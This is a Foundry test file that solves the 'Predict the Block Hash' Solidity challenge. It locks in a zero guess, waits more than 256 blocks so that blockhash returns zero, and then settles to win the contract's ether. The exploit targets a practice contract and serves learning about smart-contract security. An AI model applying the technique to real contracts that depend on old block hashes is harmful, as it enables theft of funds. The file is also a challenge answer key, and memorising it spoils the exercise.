// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PredictTheBlockHash} from "../src/PredictTheBlockHash.sol";

contract PredictTheBlockHashTest is Test {
    PredictTheBlockHash public predictTheBlockHash;
    address challenger;

    function setUp() public {
        //setup a payable address as a challenger
        challenger = vm.addr(1);
        vm.deal(challenger, 10 ether);

        predictTheBlockHash = new PredictTheBlockHash{value: 1 ether}();
        vm.startPrank(challenger);
    }

    function test_solution() public {
        uint256 settleBlock = block.number + 1;
        console.log(settleBlock);
        predictTheBlockHash.lockInGuess{value: 1 ether}(bytes32(0));
        bytes32 slot2 = vm.load(
            address(predictTheBlockHash),
            bytes32(uint256(2))
        );
        console.log(uint256(slot2));
        //check if settle block number is correct
        assertEq(settleBlock, uint256(slot2));
        vm.roll(settleBlock + 257);
        predictTheBlockHash.settle();
        assertEq(predictTheBlockHash.isComplete(), true);
    }
}
